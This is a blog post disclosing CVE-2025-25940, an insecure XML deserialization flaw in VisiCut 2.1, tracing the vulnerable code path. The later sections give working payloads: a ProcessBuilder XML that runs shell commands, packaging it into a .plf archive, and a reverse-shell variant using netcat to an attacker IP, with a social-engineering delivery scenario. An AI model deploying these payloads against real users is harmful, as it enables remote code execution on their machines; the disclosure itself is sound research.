---
title:  "CVE-2025-25940: Deserialization Vulnerability in Visicut 2.1"
date:   2025-03-06
tags: [posts]
excerpt: "Discovery of CVE-2025-25940"
---
Discovery of CVE-2025-25940
---
A new part of my weekly routine is to read through the most recently published CVEs to learn about new vulnerabilities and to observe trends in the types of vulnerabilities being discovered. One week in early January 2025, I came upon multiple vulnerabilities focused on _deserialization_. This led me down a rabbit hole of research, culminating in the discovery of my own XML deserialization vulnerability in the VisiCut software suite: **CVE-2025-25940**.

### **What is Serialization and Why is it Dangerous?**
Serialization is the process of converting an object into a format (e.g., XML, JSON) that can be stored or transmitted and later reconstructed. Deserialization is the reverse process - taking serialized data and converting it back into an object. However, if deserialization is performed on untrusted data without proper validation, attackers (or security researchers) can inject malicious objects and execute arbitrary code, leading to severe security risks.

A great video explaining deserialization exploitation is available here: [Exploit Java Deserialization](https://www.youtube.com/watch?v=KSA7vUkXGSg) by Frohoff - the creator of [ysoserial](https://github.com/frohoff/ysoserial).

## High-level Overview of CVE-2025-25940
VisiCut 2.1 is vulnerable to **insecure XML deserialization** in the `loadPlfFile` method of `VisicutModel.java`. This vulnerability occurs due to the use of `java.beans.XMLDecoder` to process user provided XML input in an unsafe manner. If an attacker supplies a ```.plf``` zip archive containing a malicious XML file, a victim user opening the ```.plf``` file could unintentionally execute arbitrary code, potentially allowing remote access to their victim machine.


## Vulnerable Code:

The vulnerable lines of code are lines 525 and 526 of [VisicutModel.java](https://github.com/t-oster/VisiCut/blob/87daf9a5f665debb8d27bce116022602b7c9e6a8/src/main/java/de/thomas_oster/visicut/VisicutModel.java#L525). In these two lines of coded, we see that the java.beans.XMLDecoder object is created and the ```readObject()``` method is used. In order to reach this code, our malicious xml file needs to contain the name of ```transform.xml```.

```java
if (name.equals((i > 0 ? i+"/" : "")+"transform.xml")) // XML needs to be called transform.xml
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry)); // Vulnerable
        transforms.put(i, (AffineTransform) decoder.readObject()); // Unsafe Deserialization
      }
```

The code is located within the ```loadPlfFile``` method.

```java
  public PlfFile loadPlfFile(MappingManager mm, File f, List<String> warnings) throws IOException {
    ZipFile zip = new ZipFile(f);
    PlfFile resultingFile = new PlfFile();
    resultingFile.setFile(f);
    //Collect for each part the transform,mapping and sourceFile
    Map<Integer,AffineTransform> transforms = new LinkedHashMap<>();
    Map<Integer,MappingSet> mappings = new LinkedHashMap<>();
    Map<Integer,File> sourceFiles = new LinkedHashMap<>();
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements())
    {
      ZipEntry entry = entries.nextElement();
      String name = entry.getName();
      Integer i = name.matches("[0-9]+/.*") ? Integer.parseInt(name.split("/")[0]) : 0;
      if (name.equals((i > 0 ? i+"/" : "")+"transform.xml"))
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry));
        transforms.put(i, (AffineTransform) decoder.readObject());
      }
```


Knowing that we need to figure out how to call the ```loadPlfFile``` method, we trace back to line 462, where this method is called within the broader ```loadFile``` method:

```java
 public void loadFile(MappingManager mm, File file, List<String> warnings, boolean discardCurrent) throws IOException, ImportException
  {
    if (PLFFilter.accept(file))
    {
      PlfFile newFile = loadPlfFile(mm, file, warnings);
      ...
      }
    }
```

In order to reach line 462, the output of ```PLFFilter.accept(file)``` must be true. This filter is defined on line 105:

```java
public static final FileFilter PLFFilter = new ExtensionFilter(".plf", "VisiCut Portable Laser Format (*.plf)");
```

Understanding that our zip file must have the .plf extension, we've determined that a .plf zip archive containing an XML file called transform.xml.

With this knowledge, we can move on to figuring out where the loadFile method is called.

There are 11 references to it in ```PreviewPanelKeyboardMouseHandler.java```, ```MainView.java```, and ```VicicutApp.Java```.

<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-loadFile.JPG" alt="">

Looking at the options, we do not want the calls that create a new File because we are going to want to supply our own malicious .plf file. 

After a little bit of code review, we see that line 1951 of MainView.java is the location where we will load our file. Here we see that loadFile is called from the openFileDialog method.
[loadFile](https://github.com/t-oster/VisiCut/blob/master/src/main/java/de/thomas_oster/visicut/gui/MainView.java#L1951)
```java
private void openFileDialog(boolean discardCurrent)
  {
    final FileFilter allFilter = VisicutModel.getInstance().getAllFileFilter();
    //On Mac os, awt.FileDialog looks more native
    if (Helper.isMacOS() || Helper.isLinux())
    {
      FileDialog openFileChooser = new FileDialog(this, bundle.getString("PLEASE SELECT A FILE"));
      openFileChooser.setMode(FileDialog.LOAD);
      if (lastDirectory != null)
      {
        openFileChooser.setDirectory(lastDirectory.getAbsolutePath());
      }
      openFileChooser.setFilenameFilter(new FilenameFilter()
      {

        public boolean accept(File dir, String file)
        {
          return allFilter.accept(new File(dir, file));
        }
      });
      openFileChooser.setVisible(true);
      if (openFileChooser.getFile() != null)
      {
        File file = new File(new File(openFileChooser.getDirectory()), openFileChooser.getFile());
        loadFile(file, discardCurrent);
      }
    }
```

Opening up VisiCut, I navigate to ```File > Open``` to find the functionality outlined in this class. This is how we will be loading our .plf PoC to exploit the vulnerable methods.
<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-VisiCut.JPG" alt="">

To summarize:
1. **malicious XML file** named `transform.xml` must be placed inside a `.plf` archive.
2. The `loadPlfFile` method is triggered bypassing the **PLFFilter check:** The file extension must be `.plf` (defined in `ExtensionFilter`).
3. **loadFile method (line 462) calls loadPlfFile** if the file meets the filter criteria.
4. **openFileDialog method in `MainView.java` (line 1951) triggers `loadFile` when a user selects a file.**

With this knowledge, lets first create our malicious plf and open it up in the VisiCut Java application. 

## **Proof-of-Concept: Creating a Malicious Payload**
To demonstrate this vulnerability, I crafted a simple proof-of-concept XML payload that creates and writes to ```/tmp/poc_test.txt``` when loaded into VisiCut:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>echo hello > /tmp/poc_test.txt</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```

Now, we package this XML file inside a `.plf` archive:

```bash
zip payload.plf transform.xml
```

Once loaded in **VisiCut**, `/tmp/poc_test.txt` is created containing the string ```hello```!

<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-VisiCut-Opened.JPG" alt="">

Proof string:
<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-POC-Test.JPG" alt="">

## **Attack Path: Reverse Shell Execution**
For a real attack scenario, we modify `transform.xml` to execute a reverse shell.

To delineate a scenario that is not too unrealistic, let's say I have been able to social engineer a user of VisiCut to open up a _cool, highspeed new laser cutting job_ that I created named ```SuperCool.plf```! This ```.plf``` contains a ```transform.xml``` file containing the following contents that will spawn a reverse shell.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>nc -c sh 192.168.35.130 9001</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>

```

Once ```SuperCool.plf``` is sent over to my victim user, I start up a netcat listener on my attacker machine.

```bash
nc -nvlp 9001
```

And when the victim loads the `.plf` file, I receive a shell granting me remote access to their system!

## **Conclusion**
This was an interesting vulnerability to research. Reviewing the source code of an open-source project provided a great opportunity to learn about insecure deserialization and how Java applications handle file inputs. 

References
---
1. NIST CVE Link
2. CVE Link
3. [VisiCut Site](https://visicut.org/)
